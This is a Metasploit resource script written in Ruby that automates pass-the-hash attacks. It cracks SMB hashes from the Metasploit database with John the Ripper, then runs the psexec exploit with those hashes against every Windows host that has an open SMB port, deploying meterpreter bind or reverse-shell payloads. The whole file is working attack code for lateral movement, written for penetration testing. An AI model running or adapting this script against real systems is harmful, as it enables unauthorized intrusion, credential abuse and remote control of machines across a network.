# auto-pass_the_hash.rb
# Author: m-1-k-3 (Web: http://www.s3cur1ty.de / Twitter: @s3cur1ty_de)

# This Metasploit RC-File could be used to automatically check already discovered windows hashes
# with jtr before login testing, after jtr is started it uses the hashes with pass the hash
# against windows fileservices. -> first we have to fill up the db with operating system infos
# we use psexec only against windows systems. Hint: smb_version


<ruby>
#psexec needs a payload
if framework.datastore['PAYLOAD'] 
	pload = framework.datastore['PAYLOAD'] 
else	#just to get sure that we have a backup payload
	pload = "windows/meterpreter/bind_tcp"
end

if pload =~ /reverse/ and not framework.datastore['LHOST']
	print_error("You have to set LHOST globally!")
	return
end

if (framework.datastore['JOHN'] == "true")	# we can set a global JOHN Option to control the usage of the jtr modules
	jotr = 1
else
	jotr = 0
end

if (framework.datastore['VERBOSE'] == "true")	#we look in the global datastore for a global VERBOSE option and use it
	verbose = 1 #true
else
	verbose = 0
end

# Test and see if we have a database connected
begin
	framework.db.hosts
rescue ::ActiveRecord::ConnectionNotEstablished
	print_error("Database connection isn't established")
	return
end

def infos(serv,creds,host)
	print_line("")
	print_line("====================================")
	print_line("IP: #{host.address}")
	print_line("OS: #{host.os_name}")
	print_line("Servicename: #{serv.name}")
	print_line("Service Port: #{serv.port.to_i}")
	print_line("Service Protocol: #{serv.proto}")
	print_line("user: #{creds.user}")
	print_line("pass: #{creds.pass}")
	print_line("====================================")
	print_line("")
end

framework.db.creds.each do |creds|	# just checking if we have any smb_hashes in the creds db
	next if (creds.ptype !~ /smb_hash/)

	if (jotr == 1)
		# first checking weak windows hashes with john ... because of the filtering before, we are sure that
		# this is a windows hash 
		# on the first found hash we are going to analyse all hashes - then we set jotr to 0

		print_line("using jtr_crack_fast")
		run_single("use auxiliary/analyze/jtr_crack_fast")
		# we use the info from Msf::Config.install_root and append the following path to it (thx to sinn3r)
		run_single("set JOHN_BASE #{Msf::Config.install_root}/data/john")
		run_single("set JOHN_PATH #{Msf::Config.install_root}/data/john")
		run_single("run -j")
		run_single("back")
		jotr = 0		# jtr modules tries to crack all smb_hashes from the db ... so we could leave it now
	end

	smbhash = creds.pass
	username = creds.user
	
	framework.db.hosts.each do |host|
		next if (host.os_name !~ /Windows/)		# pass the hash works just for Win

		host.services.each do |serv|
			next if not serv.host
			next if (serv.state != ServiceState::Open)
			next if (serv.name !~ /smb/) 

			print_line("using psexec - Pass the hash")
			if(verbose == 1)
				infos(serv,creds,host)
			end
			run_single("use exploit/windows/smb/psexec")
			run_single("set RHOST #{host.address}")
			run_single("set RPORT #{serv.port}")
			run_single("set SMBUser #{username}")
			run_single("set SMBPass #{smbhash}")
			run_single("set PAYLOAD #{pload}")
			if pload =~ /reverse/
				run_single("set LPORT #{(rand(0x8fff) + 4000).to_s}")
			end
			if(verbose == 1)
				run_single("set VERBOSE true")
			end
			run_single("exploit -j -z")
			run_single("back")
		end
	end
end
</ruby>
